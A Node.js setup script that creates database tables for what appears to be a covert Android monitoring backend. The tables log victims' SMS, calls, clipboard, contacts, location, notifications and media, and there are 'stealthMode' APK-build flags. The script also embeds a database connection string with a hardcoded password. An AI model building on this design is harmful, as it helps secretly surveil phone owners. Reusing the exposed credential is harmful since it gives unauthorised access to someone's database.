import mysql from 'mysql2/promise';

const url = 'mysql://2DAFoXqsN9Masm9.root:Jxjyr5laRZauDXZk@gateway01.us-west-2.prod.aws.tidbcloud.com:4000/test?ssl={"rejectUnauthorized":true}';

const sqlQueries = `
CREATE TABLE IF NOT EXISTS \`users\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`openId\` varchar(64) NOT NULL,
	\`name\` text,
	\`email\` varchar(320),
	\`loginMethod\` varchar(64),
	\`role\` enum('admin','manager','user','viewer') NOT NULL DEFAULT 'viewer',
	\`twoFactorEnabled\` boolean DEFAULT false NOT NULL,
	\`twoFactorSecret\` varchar(255),
	\`passwordHash\` varchar(255),
	\`isActive\` boolean DEFAULT true NOT NULL,
	\`lastSignedIn\` timestamp NULL,
	\`createdAt\` timestamp NOT NULL DEFAULT (now()),
	\`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	CONSTRAINT \`users_id\` PRIMARY KEY(\`id\`),
	CONSTRAINT \`users_openId_unique\` UNIQUE(\`openId\`),
	CONSTRAINT \`users_email_unique\` UNIQUE(\`email\`)
);

CREATE TABLE IF NOT EXISTS \`apkBuilds\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`buildId\` varchar(64) NOT NULL,
	\`createdBy\` int NOT NULL,
	\`appName\` varchar(255) NOT NULL,
	\`packageName\` varchar(255) NOT NULL,
	\`versionName\` varchar(64),
	\`versionCode\` int,
	\`iconUrl\` text,
	\`stealthMode\` boolean NOT NULL DEFAULT false,
	\`ports\` json,
	\`sslEnabled\` boolean NOT NULL DEFAULT true,
	\`serverUrl\` text,
	\`apkUrl\` text,
	\`fileSize\` bigint,
	\`status\` enum('building','ready','failed','expired') NOT NULL DEFAULT 'building',
	\`downloadCount\` int NOT NULL DEFAULT 0,
	\`expiresAt\` timestamp,
	\`createdAt\` timestamp NOT NULL DEFAULT (now()),
	\`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	CONSTRAINT \`apkBuilds_id\` PRIMARY KEY(\`id\`),
	CONSTRAINT \`apkBuilds_buildId_unique\` UNIQUE(\`buildId\`)
);

CREATE TABLE IF NOT EXISTS \`auditLogs\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`userId\` int,
	\`deviceId\` int,
	\`action\` varchar(255) NOT NULL,
	\`actionType\` enum('user_login','user_logout','user_created','user_updated','user_deleted','permission_granted','permission_revoked','device_added','device_removed','device_monitored','data_accessed','data_exported','settings_changed','security_event') NOT NULL,
	\`resourceType\` varchar(64),
	\`resourceId\` varchar(255),
	\`details\` json,
	\`ipAddress\` varchar(45),
	\`userAgent\` text,
	\`status\` enum('success','failure') NOT NULL DEFAULT 'success',
	\`timestamp\` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT \`auditLogs_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`callLogs\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`deviceId\` int NOT NULL,
	\`phoneNumber\` varchar(20) NOT NULL,
	\`contactName\` varchar(255),
	\`callType\` enum('incoming','outgoing','missed') NOT NULL,
	\`duration\` int NOT NULL,
	\`timestamp\` timestamp NOT NULL,
	\`recordedAt\` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT \`callLogs_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`clipboardLogs\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`deviceId\` int NOT NULL,
	\`content\` text NOT NULL,
	\`contentType\` varchar(64),
	\`timestamp\` timestamp NOT NULL,
	\`recordedAt\` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT \`clipboardLogs_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`contacts\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`deviceId\` int NOT NULL,
	\`name\` varchar(255) NOT NULL,
	\`phoneNumber\` varchar(20),
	\`email\` varchar(320),
	\`photoUrl\` text,
	\`notes\` text,
	\`recordedAt\` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT \`contacts_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`devicePermissions\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`deviceId\` int NOT NULL,
	\`userId\` int NOT NULL,
	\`permissionId\` int NOT NULL,
	\`grantedAt\` timestamp NOT NULL DEFAULT (now()),
	\`grantedBy\` int,
	CONSTRAINT \`devicePermissions_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`devices\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`deviceId\` varchar(255) NOT NULL,
	\`deviceName\` varchar(255) NOT NULL,
	\`manufacturer\` varchar(255),
	\`model\` varchar(255),
	\`androidVersion\` varchar(64),
	\`imei\` varchar(64),
	\`phoneNumber\` varchar(20),
	\`ownerId\` int NOT NULL,
	\`status\` enum('online','offline','inactive') NOT NULL DEFAULT 'offline',
	\`lastSeen\` timestamp,
	\`isStealthMode\` boolean NOT NULL DEFAULT false,
	\`batteryLevel\` int,
	\`storageUsed\` bigint,
	\`storageTotal\` bigint,
	\`metadata\` json,
	\`createdAt\` timestamp NOT NULL DEFAULT (now()),
	\`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	CONSTRAINT \`devices_id\` PRIMARY KEY(\`id\`),
	CONSTRAINT \`devices_deviceId_unique\` UNIQUE(\`deviceId\`),
	CONSTRAINT \`devices_imei_unique\` UNIQUE(\`imei\`)
);

CREATE TABLE IF NOT EXISTS \`geofenceEvents\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`geofenceId\` int NOT NULL,
	\`deviceId\` int NOT NULL,
	\`eventType\` enum('entry','exit') NOT NULL,
	\`latitude\` decimal(10,8),
	\`longitude\` decimal(11,8),
	\`timestamp\` timestamp NOT NULL,
	\`recordedAt\` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT \`geofenceEvents_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`geofences\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`deviceId\` int NOT NULL,
	\`name\` varchar(255) NOT NULL,
	\`latitude\` decimal(10,8) NOT NULL,
	\`longitude\` decimal(11,8) NOT NULL,
	\`radius\` decimal(10,2) NOT NULL,
	\`isActive\` boolean NOT NULL DEFAULT true,
	\`alertOnEntry\` boolean NOT NULL DEFAULT true,
	\`alertOnExit\` boolean NOT NULL DEFAULT true,
	\`createdAt\` timestamp NOT NULL DEFAULT (now()),
	\`updatedAt\` timestamp NOT NULL DEFAULT (now()) ON UPDATE CURRENT_TIMESTAMP,
	CONSTRAINT \`geofences_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`installedApps\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`deviceId\` int NOT NULL,
	\`packageName\` varchar(255) NOT NULL,
	\`appName\` varchar(255) NOT NULL,
	\`version\` varchar(64),
	\`versionCode\` int,
	\`isSystemApp\` boolean NOT NULL DEFAULT false,
	\`installTime\` timestamp,
	\`updateTime\` timestamp,
	\`recordedAt\` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT \`installedApps_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`locationHistory\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`deviceId\` int NOT NULL,
	\`latitude\` decimal(10,8) NOT NULL,
	\`longitude\` decimal(11,8) NOT NULL,
	\`accuracy\` decimal(10,2),
	\`altitude\` decimal(10,2),
	\`speed\` decimal(10,2),
	\`bearing\` decimal(10,2),
	\`provider\` varchar(64),
	\`address\` text,
	\`timestamp\` timestamp NOT NULL,
	\`recordedAt\` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT \`locationHistory_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`mediaFiles\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`deviceId\` int NOT NULL,
	\`fileType\` enum('screenshot','video','audio','photo') NOT NULL,
	\`fileName\` varchar(255) NOT NULL,
	\`fileUrl\` text NOT NULL,
	\`fileSize\` bigint,
	\`duration\` int,
	\`timestamp\` timestamp NOT NULL,
	\`recordedAt\` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT \`mediaFiles_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`notificationLogs\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`deviceId\` int NOT NULL,
	\`appName\` varchar(255) NOT NULL,
	\`title\` varchar(255),
	\`body\` text,
	\`timestamp\` timestamp NOT NULL,
	\`recordedAt\` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT \`notificationLogs_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`permissions\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`code\` varchar(64) NOT NULL,
	\`name\` varchar(255) NOT NULL,
	\`description\` text,
	\`category\` varchar(64) NOT NULL,
	\`createdAt\` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT \`permissions_id\` PRIMARY KEY(\`id\`),
	CONSTRAINT \`permissions_code_unique\` UNIQUE(\`code\`)
);

CREATE TABLE IF NOT EXISTS \`smsLogs\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`deviceId\` int NOT NULL,
	\`phoneNumber\` varchar(20) NOT NULL,
	\`messageBody\` text NOT NULL,
	\`direction\` enum('incoming','outgoing') NOT NULL,
	\`timestamp\` timestamp NOT NULL,
	\`isRead\` boolean NOT NULL DEFAULT false,
	\`threadId\` varchar(64),
	\`recordedAt\` timestamp NOT NULL DEFAULT (now()),
	CONSTRAINT \`smsLogs_id\` PRIMARY KEY(\`id\`)
);

CREATE TABLE IF NOT EXISTS \`userPermissions\` (
	\`id\` int AUTO_INCREMENT NOT NULL,
	\`userId\` int NOT NULL,
	\`permissionId\` int NOT NULL,
	\`grantedAt\` timestamp NOT NULL DEFAULT (now()),
	\`grantedBy\` int,
	CONSTRAINT \`userPermissions_id\` PRIMARY KEY(\`id\`)
);
`;

async function run() {
  const connection = await mysql.createConnection({
    uri: url,
    multipleStatements: true,
  });

  try {
    console.log("Creating tables...");
    await connection.query(sqlQueries);
    console.log("Tables created successfully.");
  } catch (err) {
    console.error("Error creating tables:", err);
  } finally {
    await connection.end();
  }
}

run();
